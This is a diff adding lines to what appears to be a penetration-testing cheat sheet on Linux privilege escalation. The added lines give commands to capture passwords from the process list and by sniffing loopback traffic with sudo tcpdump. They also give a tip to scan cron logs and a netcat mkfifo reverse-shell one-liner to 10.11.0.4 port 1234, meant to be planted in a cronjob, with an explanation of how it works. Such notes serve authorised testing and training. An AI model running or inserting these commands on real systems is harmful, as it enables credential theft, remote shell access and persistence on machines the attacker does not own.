@@ -52,4 +52,22 @@ check the following for potentially stored plain text creds... immediately try t
 
 env
 
+Capture Creds
+
+watch -n 1 "ps aux | grep pass" >> outputfile
+
+if you have tcpdump in sudo -l...
+
+sudo tcpdump -i lo -A | grep "pass"
+
+Cron Jobs
+
+1) scan system level cron jobs
+grep "CRON" /var/log/syslog
+
+2) edit a cronjob to get a reverse shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
+- this delete the fifo pipe if exists, creates another one, cats its contents to a shell with interactive i flag and redirect errors to error log, write to fifo pipe
+
+
 
